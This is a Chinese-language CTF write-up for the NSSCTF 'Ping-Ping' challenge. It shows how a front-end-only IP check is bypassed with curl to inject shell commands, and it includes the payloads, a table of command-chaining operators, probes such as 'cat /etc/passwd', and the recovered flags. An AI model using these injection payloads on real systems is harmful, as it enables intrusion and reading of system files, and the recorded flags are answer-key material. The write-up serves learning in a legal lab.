【Ping-Ping】平台：NSSCTF(3873)｜难度：☆☆☆｜日期：2026-08-01

## 考点
命令注入（Command Injection / RCE）—— 前端 JS 校验绕过

## 我的思路（老师演示版）
1. 打开页面：一个 Ping 输入框，POST 提交，参数名 `command`
2. 看前端源码：`check_ip()` 用正则限制输入必须是 IPv4 地址
3. 关键判断：**前端校验只在浏览器里跑**，用 curl 直接 POST 就绕过了
4. 后端大概率是 `system("ping ..." . $command)`，拼接进命令 = 注入点
5. 测试注入：`127.0.0.1;ls` → 成功列出 `index.php` → 确认 RCE

## 解题过程
```bash
# 1. 正常提交，观察后端行为（回显 ping 结果，确认是 BusyBox ping = Alpine 容器）
curl -X POST http://node5.anna.nssctf.cn:20611/ -d "command=127.0.0.1"

# 2. 注入测试：分号 ; 拼接第二个命令
curl -X POST http://node5.anna.nssctf.cn:20611/ --data-urlencode "command=127.0.0.1;ls"

# 3. 找 flag：/flag 不存在 cat 失败？先全盘搜
curl -X POST ... --data-urlencode "command=127.0.0.1;find / -name '*flag*' 2>/dev/null"
# -> 找到 /flag

# 4. 确认 + 读取
curl -X POST ... --data-urlencode "command=127.0.0.1;ls -la /flag"   # -rw-r--r-- root 50
curl -X POST ... --data-urlencode "command=127.0.0.1;cat /flag"
```

flag：`NSSCTF{fc310383-c8c1-45d4-9ac7-2caa4bff6c49}`（旧实例）
flag：`NSSCTF{50998fb6-53ad-40b7-a4e1-af0e8934bc8b}`（新实例）

> 注意：NSSCTF 每个靶机实例的 flag 是**动态生成**的，重启容器后 flag 会变，要重新读。提交时以自己当前靶机读出的为准。

## 收获
### 1. 前端校验 = 纸老虎
- JS 校验只拦"用浏览器点按钮"的人，拦不住 curl / Python / Burp
- 所有安全判断都要想：**后端有没有自己做校验？** 后端没校验 = 直接绕过
- 判别方法：把前端代码里的校验逻辑背下来，然后构造不含它的请求

### 2. 命令注入的本质
- 后端把用户输入拼进 shell 命令：`system("ping -c 6 " . $command)`
- 用户输入里的特殊字符被 shell 解释，改变了命令原意
- 常用拼接符号：
  | 符号 | 作用 | 例子 |
  |---|---|---|
  | `;` | 顺序执行 | `ip;ls` |
  | `|` | 管道，前命令输出给后命令 | `ip|ls` |
  | `&&` | 前成功才执行后 | `ip&&ls` |
  | `||` | 前失败才执行后 | `ip||ls` |
  | `` ` `` / `$()` | 命令替换 | `$(cat /flag)` |

### 3. 排错：cat 失败先确认文件存在与否
- `find / -name '*flag*'` 全盘搜（加 `2>/dev/null` 过滤无权限报错）
- `ls -la` 看权限/类型，确认可读再 cat
- 常见 flag 位置：`/flag`、`/flag.txt`、`/root/flag`、`/` 下找

### 4. 识别容器环境
- `PING x.x.x.x (x.x.x.x): 56 data bytes` 是 **BusyBox ping** → Alpine/Docker
- 命令注入的思路：先用 `ls`、`cat /etc/passwd`、`id` 探环境

## 常见坑
- Windows PowerShell 里 `curl` 是 Invoke-WebRequest 别名 → 用 `curl.exe`
- 中文/特殊字符建议用 `--data-urlencode` 提交
- 输出过长会被终端截断，存文件再查看
